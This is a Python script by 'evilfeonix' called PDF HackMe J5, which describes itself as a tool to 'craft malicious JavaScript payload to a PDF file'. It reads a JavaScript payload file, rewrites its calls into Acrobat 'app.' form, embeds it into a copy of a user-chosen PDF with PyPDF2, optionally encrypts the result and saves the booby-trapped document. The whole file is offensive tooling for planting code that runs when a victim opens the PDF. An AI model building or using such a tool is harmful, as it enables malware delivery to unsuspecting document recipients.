# Versoin: 1.1
# Author: evilfeonix
# Name: PDF HackMe J5
# Date: 12 - JANUARY - 2025
# Website: www.evilfeonix.com 
# Email: evilfeonix@gmail.com

# a python based-embedding script that enable user to simply craft malicious JavaScript payload to a PDF file


try:
    from colorama import Fore
    from PyPDF2 import PdfWriter, PdfReader
    import re, os, sys, time, argparse, pyfiglet
except:
    print(f' ')
    print(f'{Fore.RED}[-] Run: {Fore.GREEN}pip install -r requirements.txt')
    print(f'{Fore.WHITE}')


src_path = r'/storage/emulated/0/'
dst_path = r'/storage/emulated/0/'


def banner():
    return f"""{Fore.RED}
 ____  ____  _____     _   _   {Fore.CYAN}v[1.1]{Fore.RED}   _    __  __
|  _ \|  _ \|  ___|   | | | | __ _  ___| | _|  \/  | ___
| |_) | | | | |_ _____| |_| |/ _` |/ __| |/ / |\/| |/ _ \\
|  __/| |_| |  _|_____|  _  | (_| | (__|   <| |  | |  __/
|_|   |____/|_|       |_| |_|\__,_|\___|_|\_\_|  |_|\___|
                            _ ____
  {Fore.GREEN}Coded by {Fore.CYAN}EvilFeonix {Fore.RED}     | | ___|
  {Fore.GREEN}evilfeonix@gmail.com{Fore.RED}  _  | |___ \\
  {Fore.GREEN}www.evilfeonix.com{Fore.RED}   | |_| |___) |
                        \___/|____/
===========================================================
    """


def HackMe(js,input_pdf,output_pdf,encryption):
    write_pdf = PdfWriter()

    try:read_pdf = PdfReader(src_path+input_pdf)
    except FileNotFoundError:
        print(f'{Fore.RED}[-] {Fore.CYAN}{src_path+input_pdf}{Fore.RED}: File Not Found!')
        print(f'{Fore.WHITE}')
        os.sys.exit()

    if encryption:
        user_pswd = input(f"{Fore.BLUE}[+] Enter Password for Opening New PDF: {Fore.YELLOW}")
        owner_pswd = input(f"{Fore.BLUE}[+] Enter Password for Modifying New PDF: {Fore.YELLOW}")
    else:pass

 
    time.sleep(1)
    os.system("clear || cls")
    print(f"")
    print(banner())
    print(f"{Fore.GREEN}[*] Creating New PDF File...")
    time.sleep(1)

    try:js_file = open(js,'r')
    except FileNotFoundError:
        print(f'{Fore.RED}[-] {Fore.CYAN}{js}{Fore.RED}: File Not Found!')
        print(f'{Fore.WHITE}')
        os.sys.exit()

    js_code = js_file.read()                                                # alert;    console.log
    js_payload = re.sub(r'([a-zA-Z0-9_]+)\(',r'app.\1(',js_code)            # app.alert;    console.app.log
    js_payload = re.sub(r'(\w+)\.app.(\w+)\(',r'app.\1.\2(',js_payload)     # console.app.log ~to~ app.console.log
    js_file.close

    print(f"{Fore.GREEN}[*] Injecting JavaScript Payload...")
    # print(js_payload)
    time.sleep(2)
    write_pdf.add_js(js_payload)
    print(f"{Fore.GREEN}[*] JavaScript Payload Successfully Injected!")


    page_len = len(read_pdf.pages)
    for idx in range(page_len):
        page = read_pdf.pages[idx]
        write_pdf.add_page(page)
        
    try:
        metaName=output_pdf.split('.')
        write_pdf.add_metadata({"/Title":metaName[0],"/Author":"evilfeonix-product","/Application":T00L_N4M3,})
        # Variables like  Title,Author,Application, in your payload are modified by this fucking add_metadata
    except:
        metaName=output_pdf
        write_pdf.add_metadata({"/Title":metaName,"/Author":"evilfeonix-product","/Application":T00L_N4M3,})

    if encryption:
        time.sleep(1)
        print(f"{Fore.GREEN}[*] Encrypting New PDF File...")
        display_userP = user_pswd if user_pswd else "No Password To Assign"
        display_ownerP = owner_pswd if owner_pswd else "No Password To Assign"
        owner_pswd  =  owner_pswd if owner_pswd else None
        time.sleep(1)
        print(f"{Fore.GREEN}[*] Setting Users Password:{Fore.CYAN} {display_userP}{Fore.GREEN}...")
        time.sleep(1)
        print(f"{Fore.GREEN}[*] Setting Admin Password:{Fore.CYAN} {display_userP}{Fore.GREEN}...")
        time.sleep(1)
        print(f"{Fore.GREEN}[*] Setting Encryption Flag:{Fore.CYAN} 0b0100{Fore.GREEN}...")
        write_pdf.encrypt(user_password=user_pswd,owner_password=owner_pswd,permissions_flag=0b0100)
        time.sleep(3)
        print(f"{Fore.GREEN}[*] New PDF Successfully Encrypted!")

    location=os.path.join(L0C4T10N,output_pdf)
    with open(location,"wb") as new_pdf:
        write_pdf.write(new_pdf)

    time.sleep(1)
    print(f"{Fore.GREEN}[*] New PDF Successfully Created!")
    time.sleep(1)
    print(f"{Fore.GREEN}[*] Path To New PDF File:{Fore.CYAN} {location}")
    time.sleep(1)
    print(f"{Fore.WHITE}")



def main():
    parser = argparse.ArgumentParser(
        description  =  "a python based-embedding script that enable user to simply craft malicious Java"+ 
        "" + "Script payload to a PDF file"
    )

    parser.add_argument(
        "--payload", default = "PAYLOAD.js",
        help = "path to javascript payload file"
    )

    
    arg  =  parser.parse_args()
    
    input_pdf = input(f"{Fore.BLUE}[+] Enter Path To PDF [/storage/emulated/0/]:{Fore.YELLOW} ")
    output_pdf = input(f"{Fore.BLUE}[+] Enter Name for New PDF:{Fore.YELLOW} ")
    encrypt_pdf = input(f"{Fore.BLUE}[+] Will You Like Encrypting Your New PDF [Yes/oN]:{Fore.YELLOW} ")
    
    if not encrypt_pdf.lower() in ['y','no','n','yes']:
        print(f"{Fore.RED}[+] [-] Invalid Option.")
        print(f"{Fore.WHITE}")
        os.sys.exit()
    elif encrypt_pdf.lower() in ['y','yes']:
        encryption = True
    else:encryption = False

    
    HackMe(arg.payload,input_pdf,output_pdf,encryption)


T00L_N4M3 = "PDF-HackMe-J5"  
L0C4T10N = os.path.join(dst_path,T00L_N4M3)
if not os.path.exists(L0C4T10N):
    os.makedirs(L0C4T10N)

if __name__ == "__main__":
    main()

